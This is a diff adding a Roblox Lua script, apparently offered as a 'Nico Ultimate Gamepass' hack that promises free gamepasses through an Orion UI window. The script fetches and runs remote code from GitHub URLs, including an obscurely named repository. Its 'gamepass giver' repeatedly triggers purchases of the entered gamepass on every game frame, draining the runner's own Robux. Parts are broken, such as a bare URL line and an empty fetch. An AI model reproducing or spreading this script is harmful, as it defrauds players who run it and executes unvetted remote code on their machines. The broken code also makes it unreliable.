@@ -1,1 +1,50 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Player = game.Players.LocalPlayer
+local plrname = Player.name
+https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/gfhfdhvcjje
 
+local Window = OrionLib:MakeWindow({Name = "Nico Ultimate Gamepass", HidePremium = false, SaveConfig = true, IntroText = "Nico Ultimate Gamepass", IntroEnabled = true})
+OrionLib:MakeNotification({
+	Name = "Ultimate Gamepass ready for hack!",
+	Content = "Reloaded content... for "..plrname.." .",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+_G.ID = "0"
+_G.KeyInput = "0"
+
+-- PRIVATE SCRIPT --
+function GamepassGiver()
+loadstring(game:HttpGet(""))()
+
+gamePassId = _G.ID
+market = game:GetService("MarketplaceService")
+http = game:GetService("HttpService")
+info = market:GetProductInfo(gamePassId, Enum.InfoType.GamePass)
+game:GetService("RunService").Stepped:connect(function()
+market:PerformPurchase(Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(false))
+end)
+
+end
+
+local Tab = Window:MakeTab({
+	Name = "Key",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddTextbox({
+  Name = "Enter gamepass id",
+	Default = "0",
+	TextDisappear = true,
+	Callback = function(Value)
+		_G.KeyInput = Value
+	end
+})
+Tab:AddButton({
+	Name = "Get gamepass",
+	Callback = function()
+      		_G.KeyInput = _G.ID
+			wait(1)
+			GamepassGiver()
+  	end
+})
